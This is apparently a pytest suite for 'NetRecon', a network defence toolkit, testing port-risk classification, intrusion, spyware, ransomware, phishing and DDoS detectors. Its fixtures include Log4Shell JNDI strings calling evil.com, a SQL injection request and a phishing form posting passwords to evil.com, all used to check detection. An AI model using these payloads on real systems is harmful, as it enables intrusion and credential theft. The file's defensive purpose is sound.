"""
NetRecon Test Suite
Run with: pytest tests/ -v
"""
import pytest
import asyncio
import time
from unittest.mock import MagicMock, patch
from dataclasses import dataclass


# ── Fixtures ────────────────────────────────────────────────────────────────

@pytest.fixture
def mock_args():
    """Base mock args object for all modules."""
    args = MagicMock()
    args.interface = "eth0"
    args.duration = 5
    args.alert_level = "low"
    args.block = False
    args.verbose = False
    args.ports = "80,443"
    args.scan_type = "tcp"
    args.threads = 10
    args.timeout = 1.0
    args.banner = False
    args.os_detect = False
    args.rules = None
    args.crawl_depth = 1
    args.sqli = True
    args.xss = True
    args.lfi = False
    args.headers = True
    args.ssl = False
    args.all_vulns = False
    args.filter = None
    args.pcap = None
    args.analyze = False
    return args


# ── Port Scanner Tests ───────────────────────────────────────────────────────

class TestPortScanner:
    def test_parse_ports_range(self, mock_args):
        from tools.port_scanner import PortScanner
        mock_args.ports = "80-85"
        mock_args.target = "127.0.0.1"
        scanner = PortScanner("127.0.0.1", mock_args)
        ports = scanner._parse_ports()
        assert ports == [80, 81, 82, 83, 84, 85]

    def test_parse_ports_list(self, mock_args):
        from tools.port_scanner import PortScanner
        mock_args.ports = "22,80,443"
        scanner = PortScanner("127.0.0.1", mock_args)
        ports = scanner._parse_ports()
        assert ports == [22, 80, 443]

    def test_parse_ports_mixed(self, mock_args):
        from tools.port_scanner import PortScanner
        mock_args.ports = "22,80-82,443"
        scanner = PortScanner("127.0.0.1", mock_args)
        ports = scanner._parse_ports()
        assert 22 in ports and 80 in ports and 81 in ports and 443 in ports

    def test_classify_risk_critical(self, mock_args):
        from tools.port_scanner import PortScanner
        scanner = PortScanner("127.0.0.1", mock_args)
        risk, notes = scanner._classify_risk(6379, "Redis")
        assert risk == "critical"
        assert len(notes) > 0

    def test_classify_risk_high(self, mock_args):
        from tools.port_scanner import PortScanner
        scanner = PortScanner("127.0.0.1", mock_args)
        risk, notes = scanner._classify_risk(3389, "RDP")
        assert risk == "high"

    def test_classify_risk_low(self, mock_args):
        from tools.port_scanner import PortScanner
        scanner = PortScanner("127.0.0.1", mock_args)
        risk, _ = scanner._classify_risk(9999, "unknown")
        assert risk == "low"

    def test_ttl_os_guess_linux(self, mock_args):
        from tools.port_scanner import PortScanner
        scanner = PortScanner("127.0.0.1", mock_args)
        assert "Linux" in scanner._ttl_os_guess(64)

    def test_ttl_os_guess_windows(self, mock_args):
        from tools.port_scanner import PortScanner
        scanner = PortScanner("127.0.0.1", mock_args)
        assert "Windows" in scanner._ttl_os_guess(128)

    def test_ttl_os_guess_cisco(self, mock_args):
        from tools.port_scanner import PortScanner
        scanner = PortScanner("127.0.0.1", mock_args)
        assert "Cisco" in scanner._ttl_os_guess(255)


# ── IDS Tests ────────────────────────────────────────────────────────────────

class TestIDS:
    def test_rules_loaded(self, mock_args):
        from tools.ids import IntrusionDetectionSystem
        ids = IntrusionDetectionSystem(mock_args)
        assert ids.results.rules_loaded > 0

    def test_sqli_detection(self, mock_args):
        from tools.ids import IntrusionDetectionSystem
        ids = IntrusionDetectionSystem(mock_args)
        payload = b"GET /search?q=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1\r\n"
        ids.inspect_packet("10.0.0.1", "10.0.0.2", 80, "TCP", "", payload)
        sqli_alerts = [a for a in ids.results.alerts if "SQL" in a.rule_name]
        assert len(sqli_alerts) > 0

    def test_log4shell_detection(self, mock_args):
        from tools.ids import IntrusionDetectionSystem
        ids = IntrusionDetectionSystem(mock_args)
        payload = b"User-Agent: ${jndi:ldap://evil.com/exploit}"
        ids.inspect_packet("10.0.0.1", "10.0.0.2", 80, "TCP", "", payload)
        log4j_alerts = [a for a in ids.results.alerts if "Log4" in a.rule_name]
        assert len(log4j_alerts) > 0

    def test_alert_suppression(self, mock_args):
        from tools.ids import IntrusionDetectionSystem
        ids = IntrusionDetectionSystem(mock_args)
        payload = b"${jndi:ldap://evil.com/x}"
        # Fire same alert multiple times
        for _ in range(5):
            ids.inspect_packet("10.0.0.1", "10.0.0.2", 80, "TCP", "", payload)
        # Should suppress duplicates
        log4j = [a for a in ids.results.alerts if "Log4" in a.rule_name]
        assert len(log4j) == 1
        assert ids.results.suppressed_count > 0

    def test_brute_force_detection(self, mock_args):
        from tools.ids import IntrusionDetectionSystem
        ids = IntrusionDetectionSystem(mock_args)
        # Simulate rapid SSH connections
        for _ in range(15):
            ids.inspect_packet("10.0.0.99", "10.0.0.1", 22, "TCP", "S", b"")
        ssh_alerts = [a for a in ids.results.alerts if "SSH" in a.rule_name]
        assert len(ssh_alerts) > 0


# ── Spyware Detection Tests ──────────────────────────────────────────────────

class TestSpywareDetector:
    def test_rat_port_detection(self, mock_args):
        from tools.spyware_detector import SpywareDetector
        spy = SpywareDetector(mock_args)
        spy.analyze_packet("192.168.1.50", "1.2.3.4", 31337, "TCP", b"", 100)
        rat_inds = [i for i in spy.results.indicators if i.indicator_type == "suspicious_port"]
        assert len(rat_inds) > 0

    def test_known_spyware_ip(self, mock_args):
        from tools.spyware_detector import SpywareDetector, KNOWN_SPYWARE_IPS
        spy = SpywareDetector(mock_args)
        if KNOWN_SPYWARE_IPS:
            bad_ip = next(iter(KNOWN_SPYWARE_IPS))
            spy.analyze_packet("192.168.1.1", bad_ip, 443, "TCP", b"", 100)
            c2_inds = [i for i in spy.results.indicators if i.indicator_type == "rat"]
            assert len(c2_inds) > 0

    def test_http_spyware_header(self, mock_args):
        from tools.spyware_detector import SpywareDetector
        spy = SpywareDetector(mock_args)
        payload = b"POST /upload HTTP/1.1\r\nX-IMEI: 123456789012345\r\n\r\n"
        spy.analyze_packet("192.168.1.5", "203.0.113.1", 80, "TCP", payload, 200)
        mobile_inds = [i for i in spy.results.indicators if "IMEI" in i.description]
        assert len(mobile_inds) > 0

    def test_beacon_detection(self, mock_args):
        from tools.spyware_detector import SpywareDetector
        spy = SpywareDetector(mock_args)
        base_time = time.time()
        # Simulate regular 60s beaconing (6+ packets)
        for i in range(8):
            with patch('time.time', return_value=base_time + i * 60):
                spy._connection_times["10.0.0.5→10.0.0.99"].append(base_time + i * 60)
        interval = spy._detect_beaconing("10.0.0.5", "10.0.0.99")
        assert interval is not None
        assert 50 < interval < 70  # ~60s


# ── Ransomware Detection Tests ───────────────────────────────────────────────

class TestRansomwareDetector:
    def test_ransom_note_detection(self, mock_args):
        from tools.ransomware_detector import RansomwareDetector
        r = RansomwareDetector(mock_args)
        payload = b"YOUR FILES HAVE BEEN ENCRYPTED. Pay bitcoin to recover them."
        r.analyze_packet("10.0.0.10", "10.0.0.20", 445, "TCP", payload, 200)
        sig_inds = [i for i in r.results.indicators if i.indicator_type == "payload_sig"]
        assert len(sig_inds) > 0

    def test_lateral_movement_detection(self, mock_args):
        from tools.ransomware_detector import RansomwareDetector, UNIQUE_HOSTS_THRESHOLD
        r = RansomwareDetector(mock_args)
        for i in range(UNIQUE_HOSTS_THRESHOLD + 5):
            r.analyze_packet("10.0.0.1", f"10.0.0.{i+10}", 445, "TCP", b"", 500)
        lateral_inds = [i for i in r.results.indicators if i.indicator_type == "lateral_movement"]
        assert len(lateral_inds) > 0

    def test_risk_level_updates(self, mock_args):
        from tools.ransomware_detector import RansomwareDetector
        r = RansomwareDetector(mock_args)
        assert r.results.risk_level == "none"
        payload = b"LockBit 3.0 - Your files are encrypted"
        r.analyze_packet("10.0.0.1", "10.0.0.2", 80, "TCP", payload, 100)
        assert r.results.risk_level in ("high", "critical")

    def test_known_c2_ip(self, mock_args):
        from tools.ransomware_detector import RansomwareDetector, RANSOMWARE_C2_IPS
        r = RansomwareDetector(mock_args)
        if RANSOMWARE_C2_IPS:
            bad_ip = next(iter(RANSOMWARE_C2_IPS))
            r.analyze_packet("10.0.0.1", bad_ip, 443, "TCP", b"", 100)
            c2_inds = [i for i in r.results.indicators if i.indicator_type == "c2"]
            assert len(c2_inds) > 0


# ── Phishing Detection Tests ─────────────────────────────────────────────────

class TestPhishingDetector:
    def test_typosquatting_detection(self, mock_args):
        from tools.phishing_detector import PhishingDetector
        p = PhishingDetector(mock_args)
        # paypa1.com — obvious typosquat
        result = p._detect_typosquatting("paypa1.com")
        # May or may not catch depending on similarity threshold
        p.analyze_dns_query("192.168.1.1", "8.8.8.8", "paypal-secure-login.xyz")
        assert len(p.results.indicators) >= 0  # structural test

    def test_credential_harvest_form(self, mock_args):
        from tools.phishing_detector import PhishingDetector
        p = PhishingDetector(mock_args)
        payload = b"""<html><body>
        <form action="http://evil.com/steal">
        <input name="password" type="password">
        Your account has been suspended. Login to verify your identity.
        </form></body></html>"""
        p.analyze_http_payload("10.0.0.1", "1.2.3.4", "evil-login.com", payload)
        assert len(p.results.indicators) > 0

    def test_smtp_malicious_attachment(self, mock_args):
        from tools.phishing_detector import PhishingDetector
        p = PhishingDetector(mock_args)
        smtp_payload = b"Subject: Urgent Invoice\r\nContent-Type: application/zip\r\nfilename: invoice.exe"
        p.analyze_smtp("10.0.0.1", "10.0.0.2", smtp_payload)
        exe_inds = [i for i in p.results.indicators if "executable" in i.description.lower()]
        assert len(exe_inds) > 0

    def test_homograph_detection(self, mock_args):
        from tools.phishing_detector import PhishingDetector
        p = PhishingDetector(mock_args)
        # Test with a mixed-script domain (Unicode chars)
        result = p._detect_homograph("xn--pypal-4ve.com")  # paypal with Cyrillic
        # Result may be None for pure ASCII IDNA — just test it doesn't crash
        assert result is None or isinstance(result, str)


# ── DDoS Detection Tests ─────────────────────────────────────────────────────

class TestDDoSDetector:
    def test_syn_flood_detection(self, mock_args):
        from tools.ddos_detector import DDoSDetector, THRESHOLDS
        d = DDoSDetector(mock_args)
        threshold = THRESHOLDS["syn_flood"]["syn_per_sec"]
        # Simulate SYN flood burst
        for i in range(int(threshold * 6)):
            d.analyze_packet(f"10.{i%255}.0.1", "192.168.1.1", 80, "TCP", "S", 0, 60)
        syn_alerts = [a for a in d.results.alerts if a.attack_type == "syn_flood"]
        assert len(syn_alerts) > 0

    def test_udp_flood_detection(self, mock_args):
        from tools.ddos_detector import DDoSDetector, THRESHOLDS
        d = DDoSDetector(mock_args)
        threshold = THRESHOLDS["udp_flood"]["pkts_per_sec"]
        for i in range(int(threshold * 6)):
            d.analyze_packet(f"10.0.{i%255}.1", "192.168.1.1", 53, "UDP", "", 0, 100)
        udp_alerts = [a for a in d.results.alerts if a.attack_type == "udp_flood"]
        assert len(udp_alerts) > 0

    def test_distributed_source_detection(self, mock_args):
        from tools.ddos_detector import DDoSDetector, THRESHOLDS
        d = DDoSDetector(mock_args)
        threshold = THRESHOLDS["distributed_source"]["unique_sources"]
        for i in range(threshold + 10):
            d.analyze_packet(f"10.{i//255}.{i%255}.1", "192.168.1.100", 80, "TCP", "S", 0, 60)
        dist_alerts = [a for a in d.results.alerts if a.attack_type == "distributed_source"]
        assert len(dist_alerts) > 0

    def test_under_attack_flag(self, mock_args):
        from tools.ddos_detector import DDoSDetector, THRESHOLDS
        d = DDoSDetector(mock_args)
        assert not d.results.under_attack
        threshold = THRESHOLDS["syn_flood"]["syn_per_sec"]
        for i in range(int(threshold * 10)):
            d.analyze_packet("10.0.0.1", "192.168.1.1", 443, "TCP", "S", 0, 60)
        assert d.results.under_attack


# ── Network Monitor Tests ────────────────────────────────────────────────────

class TestNetworkMonitor:
    def test_packet_processing(self, mock_args):
        from tools.network_monitor import NetworkMonitor
        m = NetworkMonitor(mock_args)
        m.process_packet("10.0.0.1", "10.0.0.2", 54321, 80, "TCP", 500, "SA")
        assert m.results.interface_stats.total_packets == 1
        assert m.results.interface_stats.total_bytes == 500

    def test_flow_creation(self, mock_args):
        from tools.network_monitor import NetworkMonitor
        m = NetworkMonitor(mock_args)
        m.process_packet("10.0.0.1", "10.0.0.2", 54321, 443, "TCP", 300, "S")
        assert len(m.results.active_flows) == 1

    def test_protocol_breakdown(self, mock_args):
        from tools.network_monitor import NetworkMonitor
        m = NetworkMonitor(mock_args)
        m.process_packet("10.0.0.1", "10.0.0.2", 1234, 80, "TCP", 100)
        m.process_packet("10.0.0.1", "10.0.0.2", 1235, 53, "UDP", 50)
        m.process_packet("10.0.0.1", "10.0.0.2", 0, 0, "ICMP", 64)
        assert "TCP" in m.results.protocol_breakdown
        assert "UDP" in m.results.protocol_breakdown

    def test_top_talkers(self, mock_args):
        from tools.network_monitor import NetworkMonitor
        m = NetworkMonitor(mock_args)
        for _ in range(5):
            m.process_packet("10.0.0.99", "10.0.0.1", 54321, 80, "TCP", 1000)
        assert "10.0.0.99" in m.results.top_talkers_src
        assert m.results.top_talkers_src["10.0.0.99"] == 5000

    def test_dns_tracking(self, mock_args):
        from tools.network_monitor import NetworkMonitor
        m = NetworkMonitor(mock_args)
        m.process_packet("10.0.0.1", "8.8.8.8", 12345, 53, "UDP", 64,
                         dns_query="example.com")
        assert "example.com" in m.results.dns_queries

    def test_app_classification(self, mock_args):
        from tools.network_monitor import NetworkMonitor
        m = NetworkMonitor(mock_args)
        assert m._classify_app(80) == "Web"
        assert m._classify_app(25) == "Email"
        assert m._classify_app(3306) == "Database"
        assert m._classify_app(22) == "Remote Access"


# ── Report Generator Tests ───────────────────────────────────────────────────

class TestReportGenerator:
    def test_add_section(self):
        from utils.report import ReportGenerator
        r = ReportGenerator()
        r.add_section("Test", {"key": "value"})
        assert r.has_data()
        assert len(r.sections) == 1

    def test_json_output(self, tmp_path):
        import json
        from utils.report import ReportGenerator
        r = ReportGenerator()
        r.add_section("Port Scan", {"open_ports": 3, "target": "192.168.1.1"})
        out = tmp_path / "report.json"
        r.save(str(out), fmt="json")
        with open(out) as f:
            data = json.load(f)
        assert "sections" in data
        assert data["sections"][0]["name"] == "Port Scan"

    def test_html_output(self, tmp_path):
        from utils.report import ReportGenerator
        r = ReportGenerator()
        r.add_section("Test", {"data": 42})
        out = tmp_path / "report.html"
        r.save(str(out), fmt="html")
        content = out.read_text()
        assert "<!DOCTYPE html>" in content
        assert "NetRecon" in content

    def test_txt_output(self, tmp_path):
        from utils.report import ReportGenerator
        r = ReportGenerator()
        r.add_section("IDS", {"alerts": 5})
        out = tmp_path / "report.txt"
        r.save(str(out), fmt="txt")
        content = out.read_text()
        assert "NETRECON" in content
        assert "IDS" in content
